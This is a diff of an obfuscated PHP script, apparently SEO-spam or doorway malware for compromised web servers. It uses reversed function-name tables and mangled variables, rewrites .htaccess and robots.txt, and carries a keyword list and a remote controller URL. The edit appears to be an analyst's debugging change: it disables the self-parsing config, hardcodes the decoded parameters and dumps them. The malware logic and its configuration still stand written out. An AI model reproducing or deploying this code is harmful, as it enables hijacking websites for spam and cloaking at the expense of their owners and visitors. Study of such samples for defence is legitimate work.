@@ -1,4 +1,5 @@
 <?php
+/*
 @'$
 yumingid=69
 lineid=7630
@@ -11,7 +12,7 @@ cache=0000
 sps=111111010
 urlgz=[0:6~10]/^[0:6~10]-[1:4~6][0:2]-!/|[0:6~12]/^[0:6~12]-![0:1]-[0:8~10]/|[0:8~12]/^[0:6~12]-[2:10~12]-[1:3~5]-!/|^/[0:12~15][1:3][0:6~10]!/|^_[0:12~15]-[0:12~15]-!/|[0:8~12]/^[0:15~18]!/|^-[0:15][2:6][0:8]!/|^/![0:12~15]/[0:6]/|^[0:1]!-[0:15~18]/|^-[0:5~10]![0:15~18]/|^-[2:8]-[2:8~10]-[1:8~10]-!|^[0:3][2:15~18][0:3]!|[0:12]/^[0:5][1:10~12]/!|^-[2:15~18][0:5]!|[0:3]^[0:6][2:10][0:2]!|[0:8~12]^/[1:6][0:8]!|[0:6]-[0:10]/^[0:10]!-[0:2]|[0:1]-^-[1:5]-[0:5]-[1:5]-[0:5]!|^/[0:10~12]/!_[0:10~12].cgi|[0:10~15]/^[0:1]!-[0:12].jp|[0:10~12]/[0:10~12]/^[0:1]!.review|^_[0:10~12]!_[0:10~12].default|[0:10~15]/[0:10~15]/^_!.html|[0:6]/^/!/[0:15~18].html
 ';
-
+*/
 
 //$bb66b6b6b = array("soprts","esolc_lruc","tfihsnu_yarra","tini_lruc","nepof","enifed","stsixe_elif","euqinu_yarra","soprrts","yarra_ni","mirt","redaeh","emitmelif","tilps_gerp","edocedlru","pop_yarra","yarra_si","ciremun_si","liec","lla_hctam_gerp","tcartxe","ftnirps","egnar","stegf","eikooctes","foef","egrem_yarra","tnuoc","stnetnoc_teg_elif","rewolotrts","emitotrts","emaner","dro","tpotes_lruc","5dm","sopirts","emanybtsohteg","rhc","edolpxe","timil_emit_tes","emit","elffuhs","ezilairesnu","rddaybtsohteg","domhc","cexe_lruc","sehsalscdda","esolcf","etad","troba_resu_erongi","gnol2pi","hctam_gerp","trats_bo","etirwf","stsixe_noitcnuf","dnar_yarra","elif_si","hcuot","rtrts","ecalper_rts","rtsbus","lru_esrap","ecalper_gerp","nelrts","edocnelru","dnar_tm","edolpmi","ofniphp");
 
@@ -140,7 +141,7 @@ exit();
 
 
 // Why store in session?
-preg_match("/@'(.*?)';/s",$source,$_SESSION["config"]);
+//preg_match("/@'(.*?)';/s",$source,$_SESSION["config"]);
 // Store function/variable in session?
 
 //print_r($_SESSION);
@@ -759,37 +760,68 @@ function l1P9LVD($l15tGX=''){
 
     write_htaccess();
 
-    global $l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k,$l1VQ,$l11ufJ,$l1h,$l1EbALe;
+    // Config variables
+    global $l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h;
+    global $l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k;
 
     write_robots_txt($l1I);
 
-    /* Load config */
+    /* Parse config */
+    /*
     if(isset($_SESSION["config"])){
-        $l1PwXxhM = $_SESSION["config"];
+        $configs = $_SESSION["config"];
     }else{
-        preg_match("/@'\\\$(.*?)';/s",file_get_contents(__FILE__),$l1PwXxhM);
+        preg_match("/@'\\\$(.*?)';/s",file_get_contents(__FILE__),$configs);
     }
 
-    $l1PwXxhM = (is_array($l1PwXxhM) && isset($l1PwXxhM[1])) ? trim($l1PwXxhM[1]) : '';
-    $l1fV3E = array();
+    $configs = (is_array($configs) && isset($configs[1])) ? trim($configs[1]) : '';
+    //$config_params = array();
 
-    if($l1PwXxhM != ''){
-        $l1PwXxhM = explode("\n",$l1PwXxhM);
-        foreach($l1PwXxhM as $l17L){
-            $l17L=trim($l17L);
+    if($configs != ''){
+        $configs = explode("\n",$configs);
+        foreach($configs as $row){
+            $row = trim($row);
 
-            if($l17L=='') continue;
+            if($row=='') continue;
 
-            preg_match("/^\w+=(.*)/si",$l17L,$l12VVPcc);
-            if(isset($l12VVPcc[1])){
-                $l1fV3E[]=$l12VVPcc[1];
-            }
+            preg_match("/^\w+=(.*)/si",$row,$pairs);
+
+            if(isset($pairs[1])) $config_params[] = $pairs[1];
+            
         }
-        if(count($l1fV3E)!=10){
-            exit("cfg_params_error");
-        }
-        list($l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h) = $l1fV3E;
+        if(count($config_params)!=10) exit("cfg_params_error");
+        
+        list($l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h) = $config_params;
     }
+    */
+
+
+    /*
+    foreach($config_params as $c){
+        echo $c . "\n";
+    }
+    */
+
+    /* Define config parameters */
+    $config_params = array(
+                      "69",
+                      "7630",
+                      "",
+                      "pxTyIoPYDA",
+                      "rebel,specialty,LastYear,Shell,external,formal,gherkin,photography,otherthings,guide,easily,agricultural,receiver,become,bedroom,Pupil,rented,tofu,DragonBoat,behavior,council,orangejuice,removal,jeans,eggplant,middletoe,emptythe,SunnySideUp,FoldingChair,coconut",
+                      "",
+                      "http://zenjp65.tppuwjrtyj563nskt/weilai0.php",
+                      "0000",
+                      "111111010",
+                      "[0:6~10]/^[0:6~10]-[1:4~6][0:2]-!/|[0:6~12]/^[0:6~12]-![0:1]-[0:8~10]/|[0:8~12]/^[0:6~12]-[2:10~12]-[1:3~5]-!/|^/[0:12~15][1:3][0:6~10]!/|^_[0:12~15]-[0:12~15]-!/|[0:8~12]/^[0:15~18]!/|^-[0:15][2:6][0:8]!/|^/![0:12~15]/[0:6]/|^[0:1]!-[0:15~18]/|^-[0:5~10]![0:15~18]/|^-[2:8]-[2:8~10]-[1:8~10]-!|^[0:3][2:15~18][0:3]!|[0:12]/^[0:5][1:10~12]/!|^-[2:15~18][0:5]!|[0:3]^[0:6][2:10][0:2]!|[0:8~12]^/[1:6][0:8]!|[0:6]-[0:10]/^[0:10]!-[0:2]|[0:1]-^-[1:5]-[0:5]-[1:5]-[0:5]!|^/[0:10~12]/!_[0:10~12].cgi|[0:10~15]/^[0:1]!-[0:12].jp|[0:10~12]/[0:10~12]/^[0:1]!.review|^_[0:10~12]!_[0:10~12].default|[0:10~15]/[0:10~15]/^_!.html|[0:6]/^/!/[0:15~18].html"
+                    );
+
+
+    list($l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h) = $config_params;
+
+    print_r($config_params);
+
+    exit();
 
     $l1Qhzk2 = trim($l1Qhzk2);
     $l1go = trim($l1go);
